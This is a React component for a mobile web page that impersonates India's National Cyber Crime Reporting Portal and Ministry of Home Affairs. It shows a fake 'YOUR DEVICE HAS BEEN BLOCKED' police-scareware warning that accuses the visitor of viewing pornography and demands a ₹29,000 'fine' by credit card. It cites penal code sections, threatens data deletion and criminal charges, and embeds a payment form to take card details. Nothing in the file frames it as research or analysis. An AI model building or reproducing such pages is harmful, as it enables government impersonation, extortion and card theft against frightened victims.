import React, { useState, useEffect } from 'react';
import { AlertTriangle, Shield, Lock } from 'lucide-react';
import MobileHeader from './MobileHeader';
import MobilePaymentForm from './MobilePaymentForm';

const NewMobileLayout = () => {
  const [isScrolled, setIsScrolled] = useState(false);

  // Handle scroll effect for header
  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 50);
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header Section with scroll effect */}
      <div className={`sticky top-0 z-50 transition-shadow duration-300 ${isScrolled ? 'shadow-md' : ''}`}>
        <MobileHeader />
      </div>
      
      {/* Main Content Area - Smooth Scroll */}
      <div className="flex-1 overflow-y-auto scroll-smooth">
        {/* Cyber Crime Records Bureau Section */}
        <div className="bg-white p-4 border-b border-gray-200">
          <div className="text-center mb-4">
            <h2 className="text-xl font-bold text-gray-800">
              Cyber Crime Records Bureau
            </h2>
          </div>
          <div className="space-y-4 text-sm leading-relaxed">
            <p>
              <strong>IMPORTANT NOTICE:</strong> This is an official portal of the National Cyber Crime Reporting Portal, Ministry of Home Affairs, Government of India.
            </p>
            <p>
              <strong>Legal Framework:</strong> This portal operates under the Information Technology Act, 2000 and the Indian Penal Code.
            </p>
          </div>
        </div>

        {/* Device Block Message Section */}
        <div className="p-4 bg-gray-50">
          <div className="bg-red-600 text-white p-4 rounded-lg mb-4 text-center shadow-lg transform transition-transform hover:scale-[1.01]">
            <div className="flex items-center justify-center mb-3">
              <AlertTriangle className="w-8 h-8 mr-2 animate-pulse" />
              <AlertTriangle className="w-8 h-8 animate-pulse" />
            </div>
            <h1 className="text-xl font-bold mb-3">
              YOUR DEVICE HAS BEEN BLOCKED
            </h1>
            <div className="space-y-2 text-sm">
              <p className="font-semibold">
                Your device has been blocked due to repeated visits to pornographic sites containing materials prohibited by the laws of India.
              </p>
              <p className="text-yellow-200 font-bold">
                You must pay a fine of ₹29,000 by credit card as prescribed by IPC section 292 and 293.
              </p>
              <p className="text-yellow-100">
                <strong>Attention!</strong> If you fail to pay the fine or attempt to unblock your device without paying, all information will be permanently deleted.
              </p>
              <p>
                Criminal charges will be filed against you. Your device will be unlocked automatically after payment.
              </p>
            </div>
          </div>

          {/* Legal Framework Section */}
          <div className="bg-white rounded-lg p-4 mb-4 shadow-sm transform transition-transform hover:scale-[1.01]">
            <h3 className="font-semibold text-gray-900 mb-3 flex items-center">
              <Shield className="w-5 h-5 mr-2 text-blue-600" />
              Legal Framework & Compliance
            </h3>
            <div className="space-y-3 text-sm text-gray-700">
              <div className="bg-red-50 border-l-4 border-red-400 p-3 rounded">
                <p className="font-medium text-red-800">
                  <strong>Section 292 (1):</strong> Distribution of obscene content is punishable by imprisonment up to 2 years and fine up to ₹2,50,000.
                </p>
              </div>
              <div className="bg-red-50 border-l-4 border-red-400 p-3 rounded">
                <p className="font-medium text-red-800">
                  <strong>Section 292 (2):</strong> Possession of such content for viewing is equally punishable under the law.
                </p>
              </div>
              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-3 rounded">
                <p className="font-medium text-yellow-800">
                  <strong>Warning:</strong> Case materials will be transferred to Ministry of Law for criminal proceedings if fine is not paid.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Payment Form Section - Fixed at bottom with smooth transitions */}
      <div className="bg-white border-t border-gray-200 transform transition-transform duration-300">
        <div className="max-h-[80vh] overflow-y-auto scroll-smooth">
          <MobilePaymentForm />
        </div>
      </div>
    </div>
  );
};

export default NewMobileLayout; 